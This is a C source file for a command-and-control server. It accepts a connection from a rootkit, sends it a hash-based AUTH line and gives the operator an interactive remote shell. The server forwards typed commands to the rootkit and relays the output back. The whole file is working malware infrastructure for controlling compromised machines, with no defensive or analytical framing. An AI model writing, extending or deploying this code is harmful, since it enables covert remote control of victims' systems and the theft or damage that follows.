#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define BUF_SIZE     256
#define FNV1A_OFFSET 2166136261U
#define FNV1A_PRIME  16777619U

static void timestamp(void)
{
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char buf[32];
    strftime(buf, sizeof(buf), "%H:%M:%S", tm);
    printf("[%s] ", buf);
}

static uint32_t fnv1a_hash(const char *str)
{
    uint32_t hash = FNV1A_OFFSET;

    while (*str) {
        hash ^= (unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }

    return hash;
}

static int write_all(int fd, const char *buf, size_t len)
{
    while (len > 0) {
        ssize_t written = write(fd, buf, len);

        if (written <= 0)
            return -1;

        buf += written;
        len -= written;
    }

    return 0;
}

int main(int argc, char **argv)
{
    int port;
    const char *password;
    int server_fd, client_fd;
    struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
    socklen_t client_len = sizeof(client_addr);
    char buf[BUF_SIZE];
    char auth_msg[BUF_SIZE];
    int opt = 1;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <port> <password>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[1]);
    password = argv[2];
    if (port <= 0 || password[0] == '\0') {
        fprintf(stderr, "Invalid port or empty password\n");
        return 1;
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port        = htons(port);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    printf("C2 listening on port %d\n", port);

    while (1) {
        timestamp();
        printf("[?] Waiting for rootkit connection...\n");
        fflush(stdout);

        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        timestamp();
        printf("[+] Rootkit connected from %s\n", inet_ntoa(client_addr.sin_addr));
        fflush(stdout);

        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", fnv1a_hash(password));
        if (write_all(client_fd, auth_msg, strlen(auth_msg)) < 0) {
            perror("write AUTH");
            close(client_fd);
            continue;
        }

        timestamp();
        printf("[+] AUTH sent\n");
        fflush(stdout);

        printf("\n=== WLKOM INTERACTIVE SHELL ===\n");
        printf("Type your command and press Enter. Type 'exit' to quit.\n\n");

        while (1) {
            printf("c2_shell> ");
            fflush(stdout);

            /* 1. Read command from operator terminal */
            if (fgets(buf, sizeof(buf), stdin) == NULL) {
                break;
            }

            if (strncmp(buf, "exit", 4) == 0) {
                printf("Exiting interactive shell...\n");
                break;
            }

            if (buf[0] == '\n') {
                continue;
            }

            /* 2. Forward the command payload to the rootkit module */
            if (write_all(client_fd, buf, strlen(buf)) < 0) {
                perror("write command");
                break;
            }

            /* 3. Read stream until the specific end of output marker is detected */
            while (1) {
                memset(buf, 0, sizeof(buf));
                ssize_t n = read(client_fd, buf, sizeof(buf) - 1);
                if (n <= 0) {
                    printf("\n[!] Connection lost or rootkit disconnected.\n");
                    break;
                }
                
                buf[n] = '\0';
                printf("%s", buf);
                fflush(stdout);

                /* Synchronize loop and break when the transmission block ends */
                if (strstr(buf, "--- End of Output ---\n\n") != NULL) {
                    break;
                }
            }
        }

        timestamp();
        printf("[-] Rootkit disconnected\n");
        fflush(stdout);

        close(client_fd);
    }

    close(server_fd);
    return 0;
}